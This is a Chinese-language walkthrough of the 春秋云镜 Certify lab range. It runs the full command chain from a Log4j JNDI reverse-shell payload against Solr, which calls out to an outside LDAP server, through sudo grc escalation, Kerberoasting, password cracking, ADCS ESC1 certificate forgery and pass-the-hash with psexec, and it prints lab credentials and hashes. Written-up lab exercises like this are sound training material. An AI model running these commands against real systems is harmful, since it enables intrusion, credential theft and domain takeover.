## 文章

[春秋云镜 Certify Writeup](https://exp10it.cn/2023/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify-writeup/#flag02)

[春秋云境·Certify](https://fushuling.com/index.php/2023/10/06/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7certify/)

## 打靶过程

先用fscan扫一下

```bash
./fscan -h 39.99.139.131 -p 1-65535
```

![image-20231012191318621](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231012191318621.png)

存在solr，用扫描器检测一下

检测不成功，那我们访问看看

![image-20231012191620269](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231012191620269.png)

存在log4j组件

![image-20231012191659565](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231012191659565.png)

尝试用poc进行验证，成功请求

```http
/solr/admin/cores?action=${jndi:ldap://lh6atyhoktixev9c7qaz9exfp6vwjl.oastify.com}
```



![image-20231012192440993](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231012192440993.png)

利用JNDIExp搭建恶意ldap服务器

```bash
java -jar JNDIExp.jar --ip 182.92.161.222
```

反弹shell

```bash
/solr/admin/cores?action=${jndi:ldap://182.92.161.222:1389/Basic/ReverseShell/182.92.161.222/7777}
```

成功获取shell

![image-20231012193949944](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231012193949944.png)

看下sudo， 有个grc权限

```bash
sudo -l
```

![image-20231012194034324](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231012194034324.png)

grc提权获取flag

```bash
sudo grc --pty /bin/sh
```

![image-20231012194319565](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231012194319565.png)

看下网卡

```bash
ifconfig
```

![image-20231012200017516](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231012200017516.png)

传入fscan扫

```bash
./fscan -h 172.22.9.19/24
```

搭建代理

尝试用smbclient连一下172.22.9.47

```bash
python smbclient 172.22.9.47
shares
use fileshare
ls
get personnel.db
cd secret
get flag02.txt
```

获取flag和personnel.db

![image-20231012201456647](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231012201456647.png)

personnel.db用DB Broswer看一下

有一个用户表和密码表

![image-20231012201552736](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231012201552736.png)

![image-20231012201607456](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231012201607456.png)

进行爆破

```bash
proxychains4 crackmapexec smb 172.22.9.26 -u '/home/kali/Desktop/user'  -p '/home/kali/Desktop/pass' -d xiaorang.lab
```

爆出一个可用账户

![image-20231012203441836](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231012203441836.png)

```bash
xiaorang.lab\zhangjian:i9XDE02pLVf
```

尝试远程桌面后，无法连接

上一个flag提示了SPN，尝试抓取SPN

```bash
python .\GetUserSPNs.py -request xiaorang.lab/zhangjian:i9XDE02pLVf -dc-ip 172.22.9.7
```

得到zhangxia和chenchen的密码hash

![image-20231012204348214](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231012204348214.png)

用john爆一下，获取密码

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt '/home/kali/Desktop/1.txt'
```

![image-20231012204600990](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231012204600990.png)

```
MyPass2@@6       (zhangxia)     
@Passw0rd@       (chenchen) 
```

rdp登录，成功登录

![image-20231012205630579](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231012205630579.png)

之后可能是要打ADCS证书服务攻击

先看下ADCS信息

```bash
certutil
```

![image-20231012210006494](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231012210006494.png)

扫下证书漏洞

```bash
certipy find -u 'zhangxia@xiaorang.lab'  -password 'MyPass2@@6' -dc-ip 172.22.9.7 -vulnerable -stdout
```

存在ESC1漏洞

![image-20231012210349976](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231012210349976.png)

下面利用 ESC1

申请 `XR Manager` 证书模版并伪造域管理员

```bash
certipy req -u 'zhangxia@xiaorang.lab' -p 'MyPass2@@6' -target 172.22.9.7 -dc-ip 172.22.9.7 -ca 'xiaorang-XIAORANG-DC-CA' -template 'XR Manager' -upn 'administrator@xiaorang.lab'
```

![image-20231012210603734](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231012210603734.png)

利用证书获取 TGT 和 NTLM Hash

```bash
certipy auth -pfx administrator.pfx -dc-ip 172.22.9.7
```

![image-20231012210658114](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231012210658114.png)

之后用psexec横向获取flag

```bash
python psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.26 -codec gbk
python psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.7 -codec gbk
```

![image-20231012211840236](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231012211840236.png)

![image-20231012211854980](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231012211854980.png)